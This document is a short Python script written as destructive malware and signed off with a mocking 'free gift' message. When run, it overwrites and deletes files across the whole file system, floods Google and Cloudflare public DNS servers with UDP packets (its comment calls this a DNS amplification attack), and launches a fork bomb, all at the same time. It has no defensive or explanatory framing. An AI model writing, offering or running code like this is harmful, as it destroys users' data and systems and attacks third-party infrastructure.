import os
import shutil
import threading
import socket
import random

# 🔥 Phase 1: File System Obliteration  
def destroy_files():  
    for root, dirs, files in os.walk("/" if os.name != 'nt' else "C:\\"):  
        try:  
            for file in files:  
                file_path = os.path.join(root, file)  
                with open(file_path, 'wb') as f:  
                    f.write(os.urandom(1024))  # Corrupt files with garbage  
            for dir in dirs:  
                shutil.rmtree(os.path.join(root, dir), ignore_errors=True)  
        except:  
            pass  

# ☠️ Phase 2: Network Flood (DDoS Mode)  
def network_chaos():  
    targets = ["8.8.8.8", "1.1.1.1"]  # Google & Cloudflare DNS for max disruption  
    while True:  
        try:  
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
            bytes = random._urandom(65507)  
            for target in targets:  
                s.sendto(bytes, (target, 53))  # DNS Amplification Attack  
        except:  
            pass  

# 💣 Phase 3: Infinite Fork Bomb (CPU Meltdown)  
def fork_bomb():  
    while True:  
        os.system(f"{'start cmd.exe /k' if os.name == 'nt' else ':(){ :|:& };:'}")  

# 🚀 Execute All Attacks Simultaneously  
threading.Thread(target=destroy_files).start()  
threading.Thread(target=network_chaos).start()  
threading.Thread(target=fork_bomb).start()  

print("🎁 Enjoy your 'free gift'! (System corrupted in 3...2...1... 💥)")  
